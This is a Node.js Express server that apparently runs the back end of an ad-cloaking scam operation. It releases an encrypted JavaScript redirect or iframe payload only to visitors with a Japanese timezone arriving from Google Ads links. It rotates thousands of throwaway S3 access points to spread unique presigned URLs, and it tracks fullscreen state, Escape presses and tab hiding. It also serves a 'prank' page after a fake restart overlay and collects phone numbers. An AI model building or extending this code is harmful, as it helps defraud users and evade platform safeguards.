require("dotenv").config();
const path = require("path");
const express = require("express");
const cors = require("cors");
const CryptoJS = require("crypto-js");
const { v4: uuidv4 } = require("uuid");
const Redis = require("ioredis");
const {
  S3Client,
  GetObjectCommand,
  HeadObjectCommand,
} = require("@aws-sdk/client-s3");
const {
  S3ControlClient,
  CreateAccessPointCommand,
  DeleteAccessPointCommand,
  ListAccessPointsCommand,
} = require("@aws-sdk/client-s3-control");
const { getSignedUrl } = require("@aws-sdk/s3-request-presigner");

// ─── Config ───────────────────────────────────────────────────────
const ENCRYPTION_KEY =
  process.env.ENCRYPTION_KEY ||
  "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";
const PORT = process.env.PORT || 3000;
const REGION = process.env.AWS_REGION || "ap-northeast-1";
const ACCOUNT_ID = process.env.AWS_ACCOUNT_ID || "654654618464";
const BUCKET_NAME = process.env.BUCKET_NAME;
const OBJECT_KEY = process.env.OBJECT_KEY || "index.html";

const UPSTASH_REDIS_REST_URL   = process.env.UPSTASH_REDIS_REST_URL;
const UPSTASH_REDIS_REST_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;

const BATCH_SIZE = 3000;
const TOPUP_THRESHOLD = 300;
const PRESIGN_EXPIRY_SECONDS = 3600;
const TOPUP_LOCK_TTL_SECONDS = 120;
const LOCK_REFRESH_INTERVAL_MS = 30_000;
const TOPUP_CONCURRENCY = 10;
const POP_MAX_TRIES = 5;
const READINESS_MAX_MS = 60_000;

// ─── Redis keys ───────────────────────────────────────────────────
const KEY_UNUSED = "aps:unused";
const KEY_USED = "aps:used";
const KEY_BATCHES = "aps:batches";
const KEY_TOPUP_LOCK = "aps:topup_lock";
const keyBatchMembers = (id) => `aps:batch:${id}:members`;
const keyBatchRemaining = (id) => `aps:batch:${id}:remaining`;

// ─── Clients ──────────────────────────────────────────────────────
const s3Client = new S3Client({ region: REGION });
const s3Control = new S3ControlClient({ region: REGION });
const redis = new Redis(process.env.REDIS_URL);
redis.on("error", (err) => console.error("Redis error:", err.message));

// ─── Rotation target helper ───────────────────────────────────────
// Fetches the current rotating Netlify URL from Upstash REST API.
// Falls back to the hardcoded target if Redis is unreachable or empty.
async function getRotationTarget(key) {
  try {
    const res = await fetch(`${UPSTASH_REDIS_REST_URL}/get/${key}`, {
      headers: { Authorization: `Bearer ${UPSTASH_REDIS_REST_TOKEN}` },
    });
    const data = await res.json();
    return data.result || null;
  } catch (err) {
    console.error(`[rotation] Redis fetch failed (${key}):`, err.message);
    return null;
  }
}

// ─── Origin groups ────────────────────────────────────────────────
// Each origin maps to { method, target, redisKey? }.
// If redisKey is set, the target is fetched live from Redis on every
// request instead of using the hardcoded value. The hardcoded target
// acts as a fallback if Redis is unreachable or the key is empty.
//
// `method` selects which buildPayload handler runs:
//   - "iframe":      embed `target` in an iframe
//   - "redirect":    window.location.replace(target)
//   - "s3ap":        pop a unique presigned URL from the AP pool and
//                    redirect to it (target is ignored)
//   - "iframes3ap":  pop a unique presigned URL from the AP pool and
//                    embed it in an iframe (target is ignored)
const ORIGIN_GROUPS = {
  rocky: {
    "https://cute-hotteok-51402d.netlify.app": { method: "redirect", target: "https://main.d1uesk4sc6udyg.amplifyapp.com" },
    "https://takahirofarmfood.com": { method: "redirect", target: "https://main.d1uesk4sc6udyg.amplifyapp.com" },
    "https://hiroakitravels.com": { method: "redirect", target: "https://main.d1uesk4sc6udyg.amplifyapp.com" },
    "https://teruogames.org": { method: "redirect", target: "https://main.d1uesk4sc6udyg.amplifyapp.com" },
  },
  dmc: {
    // "https://middlepage.onrender.com/?gclid=twygyuewewewgvehwwhdwdwhdjwdhgwdsuidwdwd": { method: "iframe", target: "https://dmc1-environment.onrender.com" },
    "https://main.d2d7h6s2h011oz.amplifyapp.com": { method: "iframe", target: "https://main.d1uesk4sc6udyg.amplifyapp.com" },
    "https://main.d2f8uqjdeqtpz7.amplifyapp.com": { method: "iframe", target: "https://main.d1uesk4sc6udyg.amplifyapp.com" },
  },
  aomine: {
    "https://venerable-fenglisu-db94d4.netlify.app": { method: "redirect", target: "https://main.d1uesk4sc6udyg.amplifyapp.com" },
  },
};


function lookupOrigin(origin) {
  for (const [group, entries] of Object.entries(ORIGIN_GROUPS)) {
    if (entries[origin]) return { group, ...entries[origin] };
  }
  return null;
}

const JAPANESE_TIMEZONES = new Set([
  "Asia/Tokyo",
  "Japan",
  "JST",
  "GMT+9",
  "UTC+9",
  "+09:00",
  "+0900",
]);

const app = express();
app.use(cors());
app.use(express.json());

function isJapaneseTimezone(tz) {
  if (!tz || typeof tz !== "string") return false;

  const normalized = tz.trim();

  if (JAPANESE_TIMEZONES.has(normalized)) return true;

  try {
    const fmt = new Intl.DateTimeFormat("en", {
      timeZone: normalized,
      timeZoneName: "shortOffset",
    });
    const offsetPart = fmt
      .formatToParts(new Date())
      .find((p) => p.type === "timeZoneName");

    if (offsetPart) {
      const raw = offsetPart.value.replace("GMT", "").replace(":", "");
      const hours = parseInt(raw, 10);
      if (hours === 9) return true;
    }
  } catch {
    // Unknown timezone string — fall through to false
  }

  return false;
}

function hasGclid(fullUrl) {
  if (!fullUrl || typeof fullUrl !== "string") return false;
  try {
    const url = new URL(fullUrl);
    const gclid = url.searchParams.get("gclid");
    return typeof gclid === "string" && gclid.length > 0;
  } catch {
    return false;
  }
}

// ─── AP pool helpers ──────────────────────────────────────────────

async function listAllAccessPoints() {
  const names = [];
  let NextToken;
  do {
    const resp = await s3Control.send(
      new ListAccessPointsCommand({
        AccountId: ACCOUNT_ID,
        Bucket: BUCKET_NAME,
        MaxResults: 1000,
        NextToken,
      }),
    );
    for (const ap of resp.AccessPointList || []) names.push(ap.Name);
    NextToken = resp.NextToken;
  } while (NextToken);
  return names;
}

async function deleteManyAccessPoints(names) {
  let failed = 0;
  for (const name of names) {
    try {
      await s3Control.send(
        new DeleteAccessPointCommand({ AccountId: ACCOUNT_ID, Name: name }),
      );
    } catch (err) {
      if (err.name === "NoSuchAccessPoint") continue;
      failed++;
      console.error(`[AP] delete failed for ${name}: ${err.name || err.message}`);
    }
  }
  return names.length - failed;
}

// Ownership-checked Lua scripts so a stale-but-expired lock holder can never
// extend or release someone else's lock.
const SCRIPT_REFRESH_LOCK = `
if redis.call("get", KEYS[1]) == ARGV[1] then
  return redis.call("expire", KEYS[1], ARGV[2])
else
  return 0
end
`;

const SCRIPT_RELEASE_LOCK = `
if redis.call("get", KEYS[1]) == ARGV[1] then
  return redis.call("del", KEYS[1])
else
  return 0
end
`;

async function withTopupLock(label, fn) {
  const token = `${label}-${uuidv4()}`;
  const got = await redis.set(
    KEY_TOPUP_LOCK,
    token,
    "EX",
    TOPUP_LOCK_TTL_SECONDS,
    "NX",
  );
  if (!got) return { acquired: false };

  const refresher = setInterval(() => {
    redis
      .eval(SCRIPT_REFRESH_LOCK, 1, KEY_TOPUP_LOCK, token, TOPUP_LOCK_TTL_SECONDS)
      .catch(() => {});
  }, LOCK_REFRESH_INTERVAL_MS);

  try {
    const result = await fn();
    return { acquired: true, result };
  } finally {
    clearInterval(refresher);
    await redis
      .eval(SCRIPT_RELEASE_LOCK, 1, KEY_TOPUP_LOCK, token)
      .catch(() => {});
  }
}

// Probe an AP via HeadObject until S3 returns 200 (or a definitive 404 — which
// proves the AP itself works, the object just isn't there). Used at the end of
// top-up to make sure the freshest APs have propagated before we expose them.
async function waitForApReady(name, maxMs = READINESS_MAX_MS) {
  const apArn = `arn:aws:s3:${REGION}:${ACCOUNT_ID}:accesspoint/${name}`;
  const start = Date.now();
  let delay = 500;
  while (Date.now() - start < maxMs) {
    try {
      await s3Client.send(
        new HeadObjectCommand({ Bucket: apArn, Key: OBJECT_KEY }),
      );
      return true;
    } catch (err) {
      const status = err.$metadata?.httpStatusCode;
      if (status === 404 || err.name === "NotFound") return true;
      await new Promise((r) => setTimeout(r, delay));
      delay = Math.min(delay * 2, 4000);
    }
  }
  return false;
}

// Retire any batches at the head of the queue whose remaining counter is 0.
// Deletes their AWS APs in the background.
async function retireExhaustedBatches() {
  while (true) {
    const oldestId = await redis.lindex(KEY_BATCHES, 0);
    if (!oldestId) return;
    const remaining = Number(
      (await redis.get(keyBatchRemaining(oldestId))) || 0,
    );
    if (remaining > 0) return;

    const members = await redis.smembers(keyBatchMembers(oldestId));
    const tx = redis.multi();
    tx.lpop(KEY_BATCHES);
    tx.del(keyBatchMembers(oldestId));
    tx.del(keyBatchRemaining(oldestId));
    if (members.length > 0) tx.srem(KEY_USED, ...members);
    await tx.exec();

    console.log(
      `[retire] batch ${oldestId}: queuing ${members.length} APs for AWS delete`,
    );
    if (members.length > 0) {
      deleteManyAccessPoints(members).catch((e) =>
        console.error("[retire] delete:", e),
      );
    }
  }
}

let topupRunning = false;

async function runTopUp() {
  if (topupRunning) return;
  topupRunning = true;
  try {
    const lockResult = await withTopupLock("topup", async () => {
      const unused = await redis.llen(KEY_UNUSED);
      if (unused > TOPUP_THRESHOLD) {
        console.log(
          `[topUp] unused=${unused} above threshold=${TOPUP_THRESHOLD}; skipping`,
        );
        return { skipped: true };
      }

      const batchId = Date.now().toString();
      console.log(
        `[topUp] creating batch ${batchId}: ${BATCH_SIZE} APs (concurrency=${TOPUP_CONCURRENCY})…`,
      );

      const start = Date.now();
      const created = [];
      const failures = [];
      let nextI = 1;
      let progress = 0;

      async function worker() {
        while (true) {
          const i = nextI++;
          if (i > BATCH_SIZE) return;
          const name = `ap-${batchId}-${uuidv4().split("-")[0]}-${i}`;
          try {
            await s3Control.send(
              new CreateAccessPointCommand({
                AccountId: ACCOUNT_ID,
                Name: name,
                Bucket: BUCKET_NAME,
              }),
            );
            created.push(name);
          } catch (err) {
            failures.push({ name, err: err.name || err.message });
            console.error(`[topUp] create failed (${name}): ${err.name || err.message}`);
          }
          progress++;
          if (progress % 200 === 0) {
            console.log(`[topUp] progress: ${progress}/${BATCH_SIZE}`);
          }
        }
      }

      await Promise.all(
        Array.from({ length: TOPUP_CONCURRENCY }, () => worker()),
      );

      if (created.length === 0) {
        console.error("[topUp] all creates failed");
        return { skipped: false, created: 0, failed: failures.length };
      }

      // Wait for the most-recently-created AP to propagate. Earlier APs were
      // created earlier and have had even longer to become serviceable.
      const probeName = created[created.length - 1];
      const probeStart = Date.now();
      const ready = await waitForApReady(probeName, READINESS_MAX_MS);
      const probeSecs = ((Date.now() - probeStart) / 1000).toFixed(1);
      if (ready) {
        console.log(`[topUp] readiness probe ok in ${probeSecs}s`);
      } else {
        console.warn(
          `[topUp] readiness probe timed out after ${probeSecs}s; pushing anyway (pop-time probe will catch stragglers)`,
        );
      }

      const tx = redis.multi();
      tx.sadd(keyBatchMembers(batchId), ...created);
      tx.set(keyBatchRemaining(batchId), created.length);
      tx.rpush(KEY_UNUSED, ...created);
      tx.rpush(KEY_BATCHES, batchId);
      const results = await tx.exec();

      if (!results) {
        console.error(
          `[topUp] Redis MULTI aborted; rolling back ${created.length} AWS APs`,
        );
        deleteManyAccessPoints(created).catch((e) =>
          console.error("[topUp] rollback delete:", e),
        );
        return { skipped: false, created: 0, rolledBack: created.length };
      }
      const partialErrors = results
        .filter(([err]) => err)
        .map(([err]) => err.message);
      if (partialErrors.length) {
        console.error(
          `[topUp] Redis MULTI partial failure (${partialErrors.join("; ")}); rolling back ${created.length} AWS APs`,
        );
        deleteManyAccessPoints(created).catch((e) =>
          console.error("[topUp] rollback delete:", e),
        );
        return { skipped: false, created: 0, rolledBack: created.length };
      }

      const secs = ((Date.now() - start) / 1000).toFixed(1);
      console.log(
        `[topUp] batch ${batchId}: ${created.length}/${BATCH_SIZE} live, ${failures.length} failed, ${secs}s`,
      );
      return {
        skipped: false,
        created: created.length,
        failed: failures.length,
      };
    });

    if (!lockResult.acquired) {
      console.log("[topUp] another worker holds the lock; skipping");
    }
  } catch (err) {
    console.error("[topUp] error:", err);
  } finally {
    topupRunning = false;
  }
}

function maybeTriggerTopUp() {
  redis
    .llen(KEY_UNUSED)
    .then((n) => {
      if (n <= TOPUP_THRESHOLD && !topupRunning) {
        runTopUp().catch((e) => console.error("[topUp] bg:", e));
      }
    })
    .catch(() => {});
}

async function decrementOwningBatch(name) {
  const ids = await redis.lrange(KEY_BATCHES, 0, -1);
  for (const id of ids) {
    const isMember = await redis.sismember(keyBatchMembers(id), name);
    if (isMember) {
      const remaining = await redis.decr(keyBatchRemaining(id));
      if (remaining <= 0) {
        retireExhaustedBatches().catch((e) =>
          console.error("[retire]:", e),
        );
      }
      return;
    }
  }
}

// Drop a name we believe is dead from the pool's bookkeeping. Same accounting
// as a normal pop (decrements the owning batch counter so retirement still
// progresses), but skips the KEY_USED add and best-effort deletes the AP from
// AWS in case it actually exists in a broken state.
async function dropDeadAp(name, reason) {
  console.warn(`[pool] dropping AP ${name}: ${reason}`);
  await decrementOwningBatch(name);
  s3Control
    .send(new DeleteAccessPointCommand({ AccountId: ACCOUNT_ID, Name: name }))
    .catch(() => {});
}

async function nextPresignedUrl() {
  for (let attempt = 0; attempt < POP_MAX_TRIES; attempt++) {
    const name = await redis.lpop(KEY_UNUSED);
    if (!name) {
      // Pool dry — kick off an emergency topup and bail.
      runTopUp().catch((e) => console.error("[topUp] emergency:", e));
      return null;
    }

    const apArn = `arn:aws:s3:${REGION}:${ACCOUNT_ID}:accesspoint/${name}`;

    // Validate the AP is alive before issuing a URL. Self-heals stale Redis
    // entries (deleted from AWS, broken policy, never propagated, etc.).
    try {
      await s3Client.send(
        new HeadObjectCommand({ Bucket: apArn, Key: OBJECT_KEY }),
      );
    } catch (err) {
      const status = err.$metadata?.httpStatusCode;
      // 404 means the AP works but the object is missing — that's a config
      // issue, not a dead AP. Fall through and serve the URL anyway.
      if (status !== 404 && err.name !== "NotFound") {
        await dropDeadAp(name, `${err.name || "ProbeFailed"} (${status || "?"})`);
        maybeTriggerTopUp();
        continue;
      }
    }

    const presigned = await getSignedUrl(
      s3Client,
      new GetObjectCommand({ Bucket: apArn, Key: OBJECT_KEY }),
      { expiresIn: PRESIGN_EXPIRY_SECONDS },
    );

    await redis.sadd(KEY_USED, name);
    await decrementOwningBatch(name);
    maybeTriggerTopUp();
    return presigned;
  }
  console.warn(
    `[pool] gave up after ${POP_MAX_TRIES} stale APs in a row; pool may be poisoned`,
  );
  return null;
}

async function boot() {
  // Hold the top-up lock for the orphan sweep so a concurrent runTopUp can't
  // be creating APs in AWS while we classify "untracked AWS APs" as orphans
  // and delete them. Without this, the boot sweep can race a top-up's MULTI
  // and end up deleting APs that get RPUSHed into Redis seconds later.
  const lockResult = await withTopupLock("boot", async () => {
    try {
      const awsNames = await listAllAccessPoints();
      const batchIds = await redis.lrange(KEY_BATCHES, 0, -1);
      const tracked = new Set();
      for (const id of batchIds) {
        const mems = await redis.smembers(keyBatchMembers(id));
        mems.forEach((n) => tracked.add(n));
      }
      const orphans = awsNames.filter((n) => !tracked.has(n));
      if (orphans.length) {
        console.log(`[boot] cleaning ${orphans.length} orphan APs from AWS`);
        await deleteManyAccessPoints(orphans);
      } else {
        console.log("[boot] no orphan APs");
      }
    } catch (err) {
      console.error("[boot] cleanup failed:", err.message);
    }
  });

  if (!lockResult.acquired) {
    console.log(
      "[boot] top-up lock held; skipping orphan sweep (pop-time probe will self-heal stale entries)",
    );
  }

  // runTopUp acquires the lock itself, so this must happen after boot's lock
  // is released.
  const unused = await redis.llen(KEY_UNUSED);
  if (unused <= TOPUP_THRESHOLD) {
    console.log(`[boot] unused=${unused}; bootstrapping pool…`);
    await runTopUp();
  } else {
    console.log(`[boot] pool ready: ${unused} unused APs`);
  }
}

// ─── buildPayload variants ────────────────────────────────────────

function buildPayloadIframe(targetUrl) {
  return `const iframe = document.createElement("iframe");
iframe.src = "${targetUrl}";

iframe.setAttribute(
  "allow",
  "fullscreen; autoplay; encrypted-media; picture-in-picture; notifications; push",
);

iframe.setAttribute("allowfullscreen", "");
iframe.setAttribute("webkitallowfullscreen", "");
iframe.setAttribute("mozallowfullscreen", "");

iframe.setAttribute(
  "sandbox",
  "allow-scripts allow-popups allow-popups-to-escape-sandbox allow-forms allow-downloads allow-same-origin",
);

iframe.style.width = "100%";
iframe.style.height = "100%";
iframe.style.border = "0px";

const container = document.getElementById("contentiframe");
if (container) {
  container.replaceChildren(iframe);
}`;
}

function buildPayloadRedirect(targetUrl) {
  return `window.location.replace(${JSON.stringify(targetUrl)});`;
}

const BUILD_PAYLOAD_HANDLERS = {
  iframe: async (entry) => {
    let target = entry.target;
    if (entry.redisKey) {
      const dynamic = await getRotationTarget(entry.redisKey);
      if (dynamic) target = dynamic;
    }
    return buildPayloadIframe(target);
  },
  redirect: async (entry) => buildPayloadRedirect(entry.target),
  s3ap: async () => {
    const presigned = await nextPresignedUrl();
    if (!presigned) return null;
    return buildPayloadRedirect(presigned);
  },
  iframes3ap: async () => {
    const presigned = await nextPresignedUrl();
    if (!presigned) return null;
    return buildPayloadIframe(presigned);
  },
};

// ─── Routes ───────────────────────────────────────────────────────

app.post("/timezone", async (req, res) => {
  const { timezone, fullUrl } = req.body || {};
  const origin = req.headers.origin;

  const entry = origin ? lookupOrigin(origin) : null;
  if (!entry) {
    return res.status(403).json({ error: "Origin not allowed" });
  }

  if (!isJapaneseTimezone(timezone)) {
    return res
      .status(400)
      .json({ error: "Timezone is not a Japanese timezone (JST / UTC+9)" });
  }

  if (!hasGclid(fullUrl)) {
    return res
      .status(400)
      .json({ error: "fullUrl is missing gclid parameter" });
  }

  const handler = BUILD_PAYLOAD_HANDLERS[entry.method];
  if (!handler) {
    console.error(`[timezone] unknown method "${entry.method}" for ${origin}`);
    return res.status(500).json({ error: "Server misconfiguration" });
  }

  let payload;
  try {
    payload = await handler(entry);
  } catch (err) {
    console.error(`[timezone] handler error (${entry.method}):`, err.message);
    return res.status(500).json({ error: "Payload build failed" });
  }
  if (!payload) {
    return res.status(503).json({ error: "Pool empty — try again" });
  }

  const encrypted = encodeURIComponent(
    CryptoJS.AES.encrypt(payload, ENCRYPTION_KEY).toString(),
  );

  console.log(`Popup Sent [${entry.group}/${entry.method}] ${origin}`);
  return res.status(200).type("text/plain").send(encrypted);
});

app.get("/health", (_req, res) => res.json({ status: "ok" }));
app.get("/getImage", (_req, res) => res.sendFile(path.join(__dirname, "prank.webp")));

app.post("/sendPhoneNumber", express.json(), (req, res) => {
  const { phoneNumber } = req.body;
  console.log("Received phone number:", phoneNumber);
  res.json({ ok: true });
});

// 1) Serve website2's static assets (jquery/, scripts.js, style.css, songs/, images/)
//    so the relative URLs inside website2/index.html (resolved against its <base href>)
//    can fetch them. { index: false } stops Express from auto-serving the HTML at GET /.
app.use(express.static(path.join(__dirname, "website2"), { index: false }));

// 2) The endpoint website1 calls after the 10s restart overlay.
//    Returns website2/index.html as raw HTML, which website1 loads via iframe.srcdoc.
app.get("/fetchPrank", (req, res) => {
  if (!isAuthorized(req)) return res.status(403).send("Forbidden");
  res.sendFile(path.join(__dirname, "website2", "index.html"));
});

function isAuthorized(req) {
  // Replace with whatever "who is requesting" check you want.
  // Simple Netlify-origin allowlist:
  const allowed = ["https://main.d1uesk4sc6udyg.amplifyapp.com"];
  return allowed.includes(req.get("origin"));
}

app.get("/status", async (_req, res) => {
  try {
    const [unused, used, batchIds, lockVal, lockTtl] = await Promise.all([
      redis.llen(KEY_UNUSED),
      redis.scard(KEY_USED),
      redis.lrange(KEY_BATCHES, 0, -1),
      redis.get(KEY_TOPUP_LOCK),
      redis.ttl(KEY_TOPUP_LOCK),
    ]);
    const batches = [];
    for (const id of batchIds) {
      const [size, remaining] = await Promise.all([
        redis.scard(keyBatchMembers(id)),
        redis.get(keyBatchRemaining(id)),
      ]);
      batches.push({ id, size, remaining: Number(remaining || 0) });
    }
    res.json({
      unused,
      used,
      batches,
      topupRunning,
      topupLock: lockVal ? { value: lockVal, ttlSeconds: lockTtl } : null,
      config: { BATCH_SIZE, TOPUP_THRESHOLD, PRESIGN_EXPIRY_SECONDS },
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Manual top-up trigger. ?force=1 clears any stale lock + in-memory flag first.
app.post("/admin/topup", async (req, res) => {
  const force = req.query.force === "1";
  if (force) {
    await redis.del(KEY_TOPUP_LOCK).catch(() => {});
    topupRunning = false;
  }
  runTopUp().catch((e) => console.error("[topUp] manual:", e));
  res.status(202).json({ triggered: true, forced: force });
});

// Full reset: wipe all pool-related Redis keys + delete every AP in the
// bucket. Holds the top-up lock so a concurrent top-up can't keep writing
// names into Redis (or APs into AWS) while we're nuking. ?force=1 clears
// any stale lock first.
app.post("/admin/reset", async (req, res) => {
  try {
    if (req.query.force === "1") {
      await redis.del(KEY_TOPUP_LOCK).catch(() => {});
      topupRunning = false;
    }

    const lockResult = await withTopupLock("reset", async () => {
      const awsNames = await listAllAccessPoints();
      console.log(`[reset] deleting ${awsNames.length} APs from AWS…`);
      if (awsNames.length) await deleteManyAccessPoints(awsNames);

      const batchIds = await redis.lrange(KEY_BATCHES, 0, -1);
      const tx = redis.multi();
      tx.del(KEY_UNUSED);
      tx.del(KEY_USED);
      tx.del(KEY_BATCHES);
      for (const id of batchIds) {
        tx.del(keyBatchMembers(id));
        tx.del(keyBatchRemaining(id));
      }
      await tx.exec();
      return { awsDeleted: awsNames.length, batchesCleared: batchIds.length };
    });

    if (!lockResult.acquired) {
      return res.status(409).json({
        error: "Top-up in progress; retry shortly or POST with ?force=1",
      });
    }

    topupRunning = false;
    res.json({
      reset: true,
      ...lockResult.result,
      note: "Now POST /admin/topup to rebuild the pool.",
    });
  } catch (err) {
    console.error("[reset] error:", err);
    res.status(500).json({ error: err.message });
  }
});

// ─── Analytics ────────────────────────────────────────────────────

const KEY_ANALYTICS         = "analytics:sessions";
const ANALYTICS_MAX         = 3000;
const ANALYTICS_SESSION_TTL = 48 * 3600;

const keySession       = (id) => `analytics:session:${id}`;
const keySessionEvents = (id) => `analytics:session:${id}:events`;
const MAX_TIMELINE_EVENTS = 2000;

const sseClients = new Set();

function broadcastSSE(type, data) {
  if (!sseClients.size) return;
  const msg = `event: ${type}\ndata: ${JSON.stringify(data)}\n\n`;
  for (const res of sseClients) {
    try { res.write(msg); } catch { sseClients.delete(res); }
  }
}

app.post("/track", async (req, res) => {
  try {
    const body = req.body || {};
    const { sessionId, event } = body;
    if (!sessionId || !event) {
      return res.status(400).json({ error: "sessionId and event required" });
    }

    const ip =
      (req.headers["x-forwarded-for"] || "").split(",")[0].trim() ||
      req.headers["x-real-ip"] ||
      req.socket.remoteAddress ||
      "unknown";

    const now = Date.now();
    const sKey = keySession(sessionId);
    const existing = await redis.hgetall(sKey);

    if (event === "init" || !existing || !existing.id) {
      const session = {
        id:          sessionId,
        event:       event,
        ip,
        userAgent:   req.headers["user-agent"] || "",
        origin:      req.headers.origin || "",
        timezone:    body.timezone    || "",
        gclid:       body.gclid       || "",
        url:         body.url         || "",
        referrer:    body.referrer    || "",
        language:    body.language    || "",
        screenWidth:    body.screenWidth    || 0,
        screenHeight:   body.screenHeight   || 0,
        viewportWidth:  body.viewportWidth  || 0,
        viewportHeight: body.viewportHeight || 0,
        startTime:    now,
        lastSeen:     now,
        duration:     0,
        clicks:       0,
        isFullscreen: "false",
        hadFullscreen:"false",
        isHidden:     "false",
        hiddenCount:  0,
        escCount:     0,
      };
      const tx = redis.multi();
      tx.hmset(sKey, session);
      tx.expire(sKey, ANALYTICS_SESSION_TTL);
      tx.zadd(KEY_ANALYTICS, now, sessionId);
      tx.zremrangebyrank(KEY_ANALYTICS, 0, -(ANALYTICS_MAX + 1));
      await tx.exec();
      broadcastSSE("session", session);
    } else {
      const updates = { lastSeen: now, event };
      if (body.duration       !== undefined) updates.duration    = Number(body.duration)    || 0;
      if (body.clicks         !== undefined) updates.clicks      = Number(body.clicks)      || 0;
      if (body.viewportWidth  !== undefined) updates.viewportWidth  = Number(body.viewportWidth)  || 0;
      if (body.viewportHeight !== undefined) updates.viewportHeight = Number(body.viewportHeight) || 0;
      if (body.isFullscreen   !== undefined) {
        updates.isFullscreen = String(body.isFullscreen);
        // Latch: once true, hadFullscreen stays true forever so the table can
        // show "Yes" even after the user exits fullscreen.
        if (body.isFullscreen === true || body.isFullscreen === "true") {
          updates.hadFullscreen = "true";
        }
      }
      if (body.isHidden !== undefined) {
        updates.isHidden = String(body.isHidden);
        // hiddenCount is derived exclusively from /track/events (page_hidden
        // events in the timeline batch). Do NOT increment here — the two
        // endpoints are independent fetches and can diverge on tab close.
      }
      if (body.timezone) updates.timezone = body.timezone;
      if (body.gclid)    updates.gclid    = body.gclid;
      if (body.url)      updates.url      = body.url;

      await redis.hmset(sKey, updates);
      await redis.expire(sKey, ANALYTICS_SESSION_TTL);
      broadcastSSE("update", { ...existing, ...updates, id: sessionId });
    }

    res.status(200).json({ ok: true });
  } catch (err) {
    console.error("[track]", err.message);
    res.status(500).json({ error: "tracking failed" });
  }
});

app.post("/track/events", async (req, res) => {
  try {
    const { sessionId, events } = req.body || {};
    if (!sessionId || !Array.isArray(events) || !events.length) {
      return res.status(400).json({ error: "sessionId and events[] required" });
    }

    const eKey = keySessionEvents(sessionId);
    const tx = redis.multi();
    for (const ev of events) {
      tx.rpush(eKey, JSON.stringify(ev));
    }
    tx.ltrim(eKey, -MAX_TIMELINE_EVENTS, -1);
    tx.expire(eKey, ANALYTICS_SESSION_TTL);
    await tx.exec();

    // Derive hiddenCount exclusively from page_hidden events in this batch
    // so the counter always matches the timeline.
    const hiddenIncrements = events.filter(ev => ev.type === "page_hidden").length;
    if (hiddenIncrements > 0) {
      await redis.hincrby(keySession(sessionId), "hiddenCount", hiddenIncrements);
    }

    // Count ESC key presses from key events in this batch.
    const escIncrements = events.filter(ev => ev.type === "key" && (ev.data || {}).key === "Escape").length;
    if (escIncrements > 0) {
      await redis.hincrby(keySession(sessionId), "escCount", escIncrements);
    }

    // Push live counter updates to the admin dashboard so hiddenCount and
    // escCount badges update in real time without waiting for a heartbeat.
    if (hiddenIncrements > 0 || escIncrements > 0) {
      const updated = await redis.hmget(keySession(sessionId), "hiddenCount", "escCount");
      broadcastSSE("update", {
        id: sessionId,
        hiddenCount: updated[0] || "0",
        escCount:    updated[1] || "0",
      });
    }

    broadcastSSE("events", { sessionId, events });
    res.status(200).json({ ok: true });
  } catch (err) {
    console.error("[track/events]", err.message);
    res.status(500).json({ error: "failed" });
  }
});

app.get("/admin/analytics/session/:id/events", async (req, res) => {
  try {
    const raw = await redis.lrange(keySessionEvents(req.params.id), 0, -1);
    const events = raw.map((r) => { try { return JSON.parse(r); } catch { return null; } }).filter(Boolean);
    res.json({ events });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.post("/admin/analytics/clear-stale", async (req, res) => {
  try {
    const ids = await redis.zrevrange(KEY_ANALYTICS, 0, -1);
    const cutoff = Date.now() - 5 * 60 * 1000;
    const stale = [];
    for (const id of ids) {
      const s = await redis.hgetall(keySession(id));
      if (!s || !s.id || Number(s.lastSeen) < cutoff) stale.push(id);
    }
    if (stale.length) {
      const tx = redis.multi();
      for (const id of stale) {
        tx.del(keySession(id));
        tx.del(keySessionEvents(id));
        tx.zrem(KEY_ANALYTICS, id);
      }
      await tx.exec();
    }
    res.json({ cleared: stale.length });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Convert client-local date timestamps to Redis score range
function getScoreRange(from, to) {
  const minScore = from ? Number(from) : "-inf";
  const maxScore = to   ? Number(to)   : "+inf";
  return { minScore, maxScore };
}

app.get("/admin/analytics", async (req, res) => {
  try {
    const { from, to, page = "1", pageSize = "50" } = req.query;
    const { minScore, maxScore } = getScoreRange(from, to);
    const limit  = Math.min(Number(pageSize), 100);
    const offset = (Number(page) - 1) * limit;

    const [ids, total] = await Promise.all([
      redis.zrevrangebyscore(KEY_ANALYTICS, maxScore, minScore, "LIMIT", offset, limit),
      redis.zcount(KEY_ANALYTICS, minScore, maxScore),
    ]);

    // Batch all hgetall in one round-trip
    const pipeline = redis.pipeline();
    for (const id of ids) pipeline.hgetall(keySession(id));
    const results = await pipeline.exec();

    const sessions = results
      .map(([, s]) => s)
      .filter((s) => s && s.id);

    res.json({ sessions, total, page: Number(page), pageSize: limit });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get("/admin/analytics/stats", async (req, res) => {
  try {
    const { from, to } = req.query;
    const { minScore, maxScore } = getScoreRange(from, to);

    const [total, ids] = await Promise.all([
      redis.zcount(KEY_ANALYTICS, minScore, maxScore),
      redis.zrevrangebyscore(KEY_ANALYTICS, maxScore, minScore, "LIMIT", 0, 1000),
    ]);

    const pipeline = redis.pipeline();
    for (const id of ids) pipeline.hgetall(keySession(id));
    const results = await pipeline.exec();

    let withGclid = 0, totalClicks = 0, totalDuration = 0, durCount = 0;
    const uniqueIPs = new Set();
    const activeIPs = new Set();
    const gclidIPs  = new Set();
    const now = Date.now();
    for (const [, s] of results) {
      if (!s || !s.id) continue;
      const ip = s.ip || "unknown";
      uniqueIPs.add(ip);
      if (now - Number(s.lastSeen) < 45 * 1000) activeIPs.add(ip);
      if ((s.gclid || "").trim()) { withGclid++; gclidIPs.add(ip); }
      totalClicks += Number(s.clicks) || 0;
      if (Number(s.duration) > 0) { totalDuration += Number(s.duration); durCount++; }
    }

    res.json({
      total,                          // raw session count (kept for reference)
      uniqueIPs:   uniqueIPs.size,    // unique visitor IPs
      active:      activeIPs.size,    // unique IPs active in last 45 s
      withGclid,
      gclidIPs:    gclidIPs.size,     // unique IPs that had a GCLID
      totalClicks,
      avgDuration: durCount ? Math.round(totalDuration / durCount) : 0,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// ─── Funnel ───────────────────────────────────────────────────────

// Returns every unique origin + URL hostname seen across all sessions,
